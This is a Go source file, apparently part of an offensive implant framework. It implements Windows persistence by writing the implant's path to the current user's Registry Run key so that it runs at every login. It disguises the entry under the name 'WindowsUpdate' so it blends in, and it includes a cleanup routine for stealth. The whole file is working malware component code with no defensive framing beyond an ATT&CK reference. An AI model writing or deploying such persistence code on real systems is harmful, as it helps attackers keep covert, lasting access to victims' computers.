//go:build windows
// +build windows

// persistence_registry.go - Registry Run key persistence
// Reference: MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)
//
// Creates a registry entry in HKCU\Software\Microsoft\Windows\CurrentVersion\Run
// to execute the implant on user login. Uses HKCU to avoid requiring admin privileges.
//
// Note: This file is a standalone snippet for reference. The persistence.py
// module generates this code dynamically for template injection.

package main

import (
	"os"

	"golang.org/x/sys/windows/registry"
)

// installRegistryPersistence creates a Run key entry for persistence.
// Reference: MITRE ATT&CK T1547.001 (Registry Run Keys / Startup Folder)
func installRegistryPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err // Silent failure, continue execution
	}

	// Open HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	// Set the value to our executable path
	// Using an innocuous name to blend in
	err = key.SetStringValue("WindowsUpdate", exePath)
	if err != nil {
		return err
	}

	return nil
}

// removeRegistryPersistence removes the Run key entry.
// Use for cleanup or stealth operations.
func removeRegistryPersistence() error {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer key.Close()

	return key.DeleteValue("WindowsUpdate")
}
